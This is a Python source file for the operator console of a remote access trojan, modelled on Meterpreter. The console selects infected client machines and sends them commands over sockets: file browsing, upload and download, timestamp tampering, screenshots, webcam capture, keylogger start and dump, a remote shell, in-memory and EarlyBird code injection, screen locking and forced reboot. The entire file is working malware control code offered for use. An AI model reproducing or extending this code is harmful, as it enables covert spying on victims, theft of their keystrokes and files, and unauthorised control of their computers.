import sys,socket,threading,struct,cmd,shlex
import File_IO,user_spy,Keylogger,System_Function

class Meterpreter_Handler(cmd.Cmd):

    def __init__(self,client_list,sock,index):
        self.prompt = 'Meterpreter~#'
        self.Client_List = client_list # List Of Connected Client
        self.index = index # Index of Current Handling Client
        self.sock = sock # SOCKET object
        super().__init__()

    def default(self, line):
        print("[-]Invalid Command")

    def postcmd(self, stop, line):
        self.lastcmd = ''
        return super().postcmd(stop, line)

    #File io Related Commands

    def do_ls(self,path):
        '''Listing Directory'''
        if(path == ''):
            path = '.'
        if(File_IO.List_dir(self.sock,path)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True


    def do_kill(self,line):
        '''Release Connected Device'''
        try:
            self.sock.send(b'\x01\x00\x00\x00')
        except:
            pass
        finally:    
            del self.Client_List[self.index]
            return True

    def do_back(self,line):
        '''Return To Main Menu'''
        return True

    def do_cd(self,line):
        '''Change Working Directory'''
        if(line == ''):
            line = '..'
        if(File_IO.Change_Dir(self.sock,line)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    def do_pwd(self,line):
        '''Get Current Working Directory'''
        if(File_IO.pwd(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    def do_setfiletime(self,path):
        '''Set File Timestamp'''
        if(File_IO.SetFileTime(self.sock,path)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True                

    def do_del(self,path):
        '''del <file path>    ---  Delete File'''
        if(File_IO.Del_File(self.sock,path)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True


    def do_mkdir(self,path):
        '''mkdir <Directory Name> -- To Create Directory'''
        if(File_IO.Create_Dir(self.sock,path)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True


    def do_upload(self,paths):
        '''upload <file path on server> <file path to be saved on client>'''

        path = shlex.split(paths)

        if(len(path)!=2):
            print('[-]Please Provide Valid Input');return

        if(File_IO.File_Upload(self.sock,path[0],path[1])==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    def do_download(self,paths):
        '''download <file path on client> <file path on server'''
        path = shlex.split(paths)

        if(len(path)!=2):
            print('[-]Please Provide Valid Input');return

        if(File_IO.File_Download(self.sock,path[0],path[1])==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    #---------------------------------------------------------------------
    #Spying on user commands
    
    def do_screenshot(self,line):
        '''screenshot -- Capture ScreenShot'''
        if(user_spy.ScreenShot(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True        

    def do_list_webcam(self,line):
        '''List Installed Webcam Driver'''
        if(user_spy.List_Webcam(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True


    def do_webcam_capture(self,Id):
        '''webcam_capture <Driver Id> -- Capture Webcamshot'''
        if(user_spy.Webcam_Capture(self.sock,Id)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    #keylogger

    def do_keylog_start(self,arg):
        '''To Activate Keylogger'''
        if(Keylogger.Keylogger_Start(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True            

    def do_keylog_stop(self,arg):
        '''To Deactivate Keylogger'''
        if(Keylogger.Keylogger_Stop(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    def do_keylog_status(self,arg):
        '''View status of Keylogger'''
        if(Keylogger.Keylogger_Status(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    def do_keylog_time(self,arg):
        '''View Last Keystroke time'''
        if(Keylogger.Keylogger_time(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    def do_keylog_dump(self,arg):
        '''Dump Keystroke'''
        if(Keylogger.Keylogger_Dump(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True


    #-----------------------------------------------
    # 
    # System Command

    def do_ps(self,arg):
        '''View Running Process on client'''
        if(System_Function.List_Process(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    def do_shell(self,arg):
        '''Droping Command Shell'''
        if(System_Function.Shell(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True 


    def do_pe_ref_exec(self,arg):
        '''Execting File In Memory or EarlyBird Technique
        Usage pe_ref_exec <method> <arguments...>
        
        Methods         Argument
        -------         --------
        in_memory       <pid> <file>
        early_bird      <exe_file_On_client> <file>
        '''
        args = shlex.split(arg)
        if(arg == '') or (len(args) != 3):
            print('[-]Insufficient Argument');return

        if(args[0]=='in_memory'):
            if(System_Function.In_memory_exec(self.sock,args[1],args[2])==404):
                self.sock.close()
                del self.Client_List[self.index]
                return True

        elif (args[0]=='early_bird'):
            if(System_Function.Early_Bird(self.sock,args[1],args[2])==404):
                self.sock.close()
                del self.Client_List[self.index]
                return True

        else:
            print('[-]Unknown Method')


    def do_change_wallpaper(self,arg):
        '''change_wallpaper <path_of_image_on_Client>'''
        if(System_Function.Change_Wallpaper(self.sock,arg)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True


    def do_lockwindow(self,arg):
        '''Lock Client Windows'''
        if(System_Function.LockWindow(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True


    def do_reboot(self,arg):
        '''
        Restart / Shut Down Client PC
        
        Optinons

        --forced 1/0            Force PC to Reboot.Default 1
        --timeout <sec>         Timeout to Reboot.Default 5
        --restart 1/0           Reboot or Shutdown
        --msg                   Show Message Before ShutDown
        '''
        if(System_Function.reboot(self.sock,shlex.split(arg))==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True


    def do_list_installed(self,arg):
        '''To List Installed Program On Client Computer'''
        if(System_Function.List_Installed(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True

    def do_list_disk(self,arg):
        '''To List Disk On Client Computer'''
        if(System_Function.List_Disk(self.sock)==404):
            self.sock.close()
            del self.Client_List[self.index]
            return True             

#-------------------------------------------------------------------
# 
#         
class Menu(cmd.Cmd):

    def __init__(self,client_list):
        self.prompt = 'Main Menu~$'
        self.Client_List = client_list
        super().__init__()

    def postcmd(self, stop, line):
        self.lastcmd = ''
        return super().postcmd(stop, line)    

    def do_select(self,arg):
        '''Select A Device'''
        try:
            index = int(arg)
            obj = self.Client_List[index]

            meterpreter = Meterpreter_Handler(self.Client_List,obj[0],index)
            meterpreter.cmdloop()
            del meterpreter

        except ValueError as Err:
            print(str(Err))
        except IndexError as Err:
            print(str(Err))

    def do_exit(self,arg):
        '''To Exit'''
        for i in self.Client_List:
            i[0].close()

        return True

    def do_list(self,arg):
        '''List Connected Device'''
        index = 0
        for i in self.Client_List:
            print(index,i[1]);index+=1

    def default(self, line):
        print('[-]Invalid Command')